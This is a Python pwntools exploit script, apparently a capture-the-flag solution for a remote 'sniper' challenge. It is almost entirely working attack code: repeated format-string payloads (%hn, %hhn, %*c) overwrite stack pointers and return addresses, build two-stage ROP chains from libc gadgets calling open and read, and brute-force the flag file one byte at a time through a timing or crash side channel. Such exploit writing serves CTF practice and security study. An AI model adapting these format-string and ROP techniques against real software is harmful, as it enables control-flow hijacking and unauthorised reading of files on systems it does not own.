from pwn import *
from tqdm import tqdm
import sys

context.log_level = "error"

libc = ELF("./libc.so.6")

ret_byte = 0x8
ptr_ptr = 11
ptr_wrt_idx = 40
wrt_ptr = 45

ret_fgets = 0x2025c9 # text + offset
text_base = 0x22b000 # libc_base + offset
start = 0x2023f0

if(len(sys.argv) == 1):
    print("need to identify the flag offset to leak")
    print("usage: python3 exp.py <offset>")
    exit(1)

flag_offset = int(sys.argv[1])

print(f"finding flag[{flag_offset}] byte")
while(1):
    try:
        #p = remote("localhost", 5315)
        #p = remote("host1.dreamhack.games", 21635)
        p = remote("war.sschall.xyz", 35355)
        

        ru = p.recvuntil
        snl = p.sendline
        
        ru(b"sniper\n")
        
        pay = b"%c" * (ptr_ptr  - 1)
        pay += b"%*c"
        pay += f"%{0xfff0 - (ptr_ptr - 1)}c".encode()
        pay += b"%hn"
        pay += b"%c" * 24
        pay += f"%{0xfef8 - 24}c".encode()
        pay += b"%hn"
        pay += f"%{0x159 - ret_byte}c".encode()
        pay += b"%38$hhn"
        snl(pay)
        sleep(0.5)

        pay = b"%c" * (ptr_ptr  - 1)
        pay += b"%*c"
        pay += f"%{0x28 - (ptr_ptr - 1)}c".encode()
        pay += b"%hn"
        pay += f"%{0x11}c".encode()
        pay += b"%38$hhn"
        pay += b"%40$n"
        snl(pay)
        sleep(0.5)
        
        pay = b"%c" * (ptr_ptr  - 1)
        pay += b"%*c"
        pay += b"%c" * 26
        pay += f"%{0xfee8 - (ptr_ptr - 1) - 26}c".encode()
        pay += b"%hn"
        pay += f"%{0x159 - ret_byte}c".encode()
        pay += b"%45$hhn"
        snl(pay)
        sleep(0.5)

        # check libc is valid
        pay = b"%c" * 6
        pay += b"%*c"
        pay += f"%{ret_fgets - 6}c".encode()
        pay += b"%45$n"
        snl(pay)
        sleep(0.5)

        for i in tqdm(range(20)):
            pay = f"%{0x59}c".encode()
            pay += b"%45$hhn"
            snl(pay) 
            sleep(0.5)

        break
    except:
        p.close()


pay = b"%c" * 6
pay += b"%*c"
pay += f"%{start - 6}c".encode()
pay += b"%45$n"
snl(pay)
sleep(0.1)

ret_byte = (ret_byte - 0x110) & 0xff # 0xf8 (- 0x110) & 0xff
ptr_ptr = ptr_ptr + (0x110 // 8)
#ptr_wrt_idx = 40 # + (0x110 // 8) 
#wrt_ptr = 45 # 79

cpy_off = 68
ptr_ptr = 74
wrt_ptr = 79
libc_ptr = 41


text_base = 0x22b000
start = 0x001180 + text_base
main = 0x01359 + text_base

# set pointer
pay = b"%c" * (cpy_off  - 1)
pay += b"%*c"
pay += b"%c" * 3
pay += f"%{0xfde0 - (cpy_off - 1) - 3}c".encode()
pay += b"%hn"
pay += b"%c" * 3
pay += f"%{0x159 - ret_byte - 3}c".encode()
pay += b"%hhn" 
snl(pay)
sleep(0.1)

# jump to start
pay = b"%c" * 60
pay += b"%*c"
pay += f"%{start - 60 - 0x29e40}c".encode()
pay += b"%79$n"
snl(pay)
sleep(0.1)


# setting ptr
pay = b"%c" * 78
pay += b"%*c"
pay += b"%c" * 26
pay += f"%{0xfcc8 - 78 - 26}c".encode()
pay += b"%hn"
pay += f"%{0x159 - 0xe8}c".encode()
pay += b"%113$hhn"
snl(pay)
sleep(0.1)

def stg1_rop(off, data=0, num=0):
    pay = b"%c" * 78
    pay += b"%*c"
    pay += f"%{0xfcd0 + off - 78}c".encode()
    pay += b"%hn"
    pay += f"%{0x1059 - (off+0xf0 & 0xff)}c".encode()
    pay += b"%113$hhn"
    snl(pay)
    sleep(0.5)

    if(num):
        pay = b"%108$lln"
        pay += f"%{0x59}c".encode()
        pay += b"%113$hhn"
        snl(pay)
        sleep(0.5)

        pay = f"%{data}c".encode()
        pay += b"%108$n"
        pay += f"%{0x1059 - data}c".encode()
        pay += b"%113$hhn"
        snl(pay)
        sleep(0.5)
    else: 
        pay = b"%c" * 74
        pay += b"%*c"
        pay += f"%{data - 74 - 0x29d90}c".encode()
        pay += b"%108$n"
        pay += f"%{0x1059 - (data & 0xff)}c".encode()
        pay += b"%113$hhn"
        snl(pay)
        sleep(0.5)

ppp_rdx = 0x904a8 #: pop rax ; pop rdx ; pop rbx ; ret ; \x58\x5a\x5b\xc3 (1 found)
p_rdi = 0x2c300
p_rsi = 0x3dd16                            
ppp_rdx = 0x108b03 #: pop rdx ; pop rcx ; pop rbx ; ret ; \x5a\x59\x5b\xc3 (1 found)                  
p5_ret = 0x2c2f8
p6_ret = 0x355af 
p7_ret = 0x86307 # : pop rax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret ;
memcpy = 0x25afb0
spray_addr = 0x21a018

"""
pop rdi     # for jump  (-1, 0)
pop rdi     # setting rdi to stack (1, 2)
pop * 5 ret # jump (3, 4, 5, 6, 7, 8, 9)
pop rsi     # setting rsi to libc (10, 11)
pop * 5 ret # jump (12, 13, 14, 15, 16, 17)
pop * 3 ret # 18, 19, 20, 21
pop rdx     # setting rdx
pop * 5 ret # jump
memcpy
main
"""

print("[*] setting stage1 rop")
stg1_rop(8, p_rdi)
stg1_rop(0x18, p5_ret)
stg1_rop(0x48, p_rsi)
stg1_rop(0x50, spray_addr)
stg1_rop(0x58, p5_ret)
stg1_rop(0x88, ppp_rdx)
stg1_rop(0x90, 0xf8, 1)
stg1_rop(0xa8, p6_ret)
stg1_rop(0xe0, memcpy)
stg1_rop(0xe8, main)

pay = b"%c" * 78
pay += b"%*c"
pay += f"%{0xfcd0 + 0x10 - 78}c".encode()
pay += b"%hn"
pay += f"%{0x1059 - (0x10+0xf0 & 0xff)}c".encode()
pay += b"%113$hhn"
snl(pay)
sleep(0.5)

pay = b"%c" * 78
pay += b"%*c"
pay += f"%{0xfdc0 - 78}c".encode()
pay += b"%108$hn"
pay += f"%{0x1059 - 0xe0}c".encode()
pay += b"%113$hhn"
snl(pay)
sleep(0.5)

print("[*] trigger stage1 rop")
pay = b"%c" * 74
pay += b"%*c"
pay += f"%{p_rdi - 74 - 0x29d90}c".encode()
pay += b"%113$n"
snl(pay)
sleep(0.5)


# setting ptr
pay = b"%c" * 48
pay += b"%*c"
pay += f"%{0x10028 - 48}c".encode()
pay += b"%hn"
pay += b"%c" * 24
pay += f"%{0xfd90 - 24}c".encode()
pay += b"%hn"
pay += f"%{0x159 - 0xd8}c".encode()
pay += b"%83$hhn"
snl(pay)
sleep(0.5)


# jump to start
def stg2_rop(off, data=0, num=0):
    pay = b"%c" * 48
    pay += b"%*c"
    pay += f"%{0xfdc0 + off - 48}c".encode()
    pay += b"%hn"
    pay += f"%{0x1059 - (off+0xe0 & 0xff)}c".encode()
    pay += b"%83$hhn"
    snl(pay)
    sleep(0.5)

    if(num):
        pay = b"%78$lln"
        pay += f"%{0x59}c".encode()
        pay += b"%83$hhn"
        snl(pay)
        sleep(0.5)
        
        if(data):
            pay = f"%{data}c".encode()
            pay += b"%78$n"
            pay += f"%{0x1059 - data}c".encode()
            pay += b"%83$hhn"
            snl(pay)
            sleep(0.5)
    else: 
        pay = b"%c" * 44
        pay += b"%*c"
        pay += f"%{data - 44 - 0x29d90}c".encode()
        pay += b"%78$n"
        pay += f"%{0x1059 - (data & 0xff)}c".encode()
        pay += b"%83$hhn"
        snl(pay)
        sleep(0.5)


pp_rdx = 0x904a9
flag_str = 0x26bf80
flag_addr = flag_str + 0x40
mov_rax = 0x14a1cc # : mov rax, qword [rax] ; ret ; \x48\x8b\x00\xc3 (1 found)
p_rax = 0x115f6b # : pop rax ; ret ;
chk_addr = 0x230000
get_data = 0xea373 #: mov rdx, qword [rdi+0x18] ; mov qword [rdi+0x18], rdx ; ret
ppp_rdx = 0xa85a9 #: pop rdx ; xor eax, eax ; pop rbp ; pop r12 ; ret ;
xor_gad = 0x14e5c0  #: xor rdx, qword [rsi+0x08] ; xor rax, qword [rsi+0x10] ; or rax, rdx ; sete al ; movzx eax, al ; ret ;
p_rsp = 0x3a9ac #: pop rsp ; ret ;

#chk_gad = 0x834fe: test rdx, rdx ; jne 0x000834F0 ; ret ; \x48\x85\xd2\x75\xed\xc3 (1 found)

chk_gad = 0x8a600 #: test rax, rax ; je 0x0008A610 ; pop rbx ; ret ; \x48\x85\xc0\x74\x0b\x5b\xc3 (1 found)
#chk_gad = 0x13541d #: test rax, rax ; je 0x00135430 ; add rsp, 0x08 ; ret ; \x48\x85\xc0\x74\x0e\x48\x83\xc4\x08\xc3 (1 found)

mov_gad = 0xbf888 #: mov rax, rdx ; ret ; \x48\x89\xd0\xc3 (1 found)


print("[*] setting stage2 rop")
stg2_rop(0, flag_str)
stg2_rop(8, p_rsi)
stg2_rop(0x10, 0, 1)
stg2_rop(0x18, libc.symbols['open'])
stg2_rop(0x20, p_rdi)
stg2_rop(0x28, 3, 1)
stg2_rop(0x30, p_rsi)
stg2_rop(0x38, flag_addr)
stg2_rop(0x40, pp_rdx)
stg2_rop(0x48, flag_offset+1, 1)
stg2_rop(0x50, flag_offset+1, 1)
stg2_rop(0x58, libc.symbols['read'])
stg2_rop(0x60, p_rsi)
stg2_rop(0x68, start)
stg2_rop(0x70, pp_rdx)
stg2_rop(0x78, 0, 1)
stg2_rop(0x80, 0, 1)
stg2_rop(0x88, p_rsi)
stg2_rop(0x90, flag_addr+flag_offset-8)
stg2_rop(0x98, xor_gad)
stg2_rop(0xa0, mov_gad)
stg2_rop(0xa8, chk_gad)

stg2_rop(0xb8, p_rdi+1)
stg2_rop(0xc0, p_rdi+1)
stg2_rop(0xc8, p_rdi+1)
stg2_rop(0xd0, p_rdi+1)
stg2_rop(0xd8, p_rdi+1)
stg2_rop(0xe0, p_rax)
stg2_rop(0xe8, start)
stg2_rop(0xf0, p_rsp)

# setting flag string
pay = f"%{0x67616c66}c".encode()
pay += b"%6$n"
pay += f"%{0x159 - 0x66}c".encode()
pay += b"%83$hhn"
snl(pay)
sleep(0.5)

pay = b"%c" * 48
pay += b"%*c"
pay += f"%{0xfeb8 - 48}c".encode()
pay += b"%hhn"
pay += f"%{0x159 - 0xd8}c".encode()
pay += b"%83$hhn"
snl(pay)
sleep(0.5)

pay = b"%c" * 48
pay += b"%*c"
pay += b"%c" * 26
pay += f"%{0xfe28 - 48 - 26}c".encode()
pay += b"%hn"
pay += f"%{0x159 - 0x48}c".encode()
pay += b"%83$hhn"
snl(pay)
sleep(0.5)


pay = b"%c" * 44
pay += b"%*c"
pay += f"%{p_rdi - 44 - 0x29d90}c".encode()
pay += b"%83$n"
snl(pay)
sleep(0.5)


pay = b"%c" * 68
pay += b"%*c"
pay += f"%{0x10028 - 68}c".encode()
pay += b"%hn"
pay += b"%c" * 24
pay += f"%{0xfcf0 - 24}c".encode()
pay += b"%hn"
pay += f"%{0x159 - 0x38}c".encode()
pay += b"%103$hhn"
snl(pay)
sleep(0.5)

def aaw(off, data=0, num=0):
    pay = b"%c" * 68
    pay += b"%*c"
    pay += f"%{0xfd20 + off - 68}c".encode()
    pay += b"%hn"
    pay += f"%{0x159 - (off+0x40 & 0xff)}c".encode()
    pay += b"%103$hhn"
    snl(pay)
    sleep(0.5)

    if(num):
        pay = b"%98$lln"
        pay += f"%{0x59}c".encode()
        pay += b"%103$hhn"
        snl(pay)
        sleep(0.5)
        
        if(data):
            pay = f"%{data}c".encode()
            pay += b"%98$n"
            pay += f"%{0x1059 - data}c".encode()
            pay += b"%103$hhn"
            snl(pay)
            sleep(0.5)
    else:
        pay = b"%c" * 64
        pay += b"%*c"
        pay += f"%{data - 64 - 0x29d90}c".encode()
        pay += b"%98$n"
        pay += f"%{0x1059 - (data & 0xff)}c".encode()
        pay += b"%103$hhn"
        snl(pay)
        sleep(0.5)


add_rsp = 0xc46bc #: add rsp, 0x0000000000000100 ; sub rax, rdx ; ret ; \x48\x81\xc4\x00\x01\x00\x00\x48\x29\xd0\xc3 (1 found)

aaw(8, add_rsp)
pay = b"%c" * 64
pay += b"%*c"
pay += f"%{p_rdi - 64 - 0x29d90}c".encode()
pay += b"%103$n"
snl(pay)
sleep(0.5)

def check_byte(val):
    aaw(8, add_rsp)
    aaw(0x118, val, 1)
    
    pay = b"%c" * 64
    pay += b"%*c"
    pay += f"%{p_rdi - 64 - 0x29d90}c".encode()
    pay += b"%103$n"
    snl(pay)
    sleep(0.5) 

    for i in range(5):
        pay = f"%{0x59}c".encode()
        pay += b"%103$hhn"
        snl(pay)
        sleep(0.5)

sleep(10)
value = 0x2e

print("checking flag bytes")
while(value < 0x7f):
    try:
        value += 1
        print(f"checking value: {hex(value)}")
        check_byte(value)
    except:
        p.close()
        break


print(f"flag[{flag_offset}]: {value.to_bytes(1, 'big')}({hex(value)})")

p.interactive()
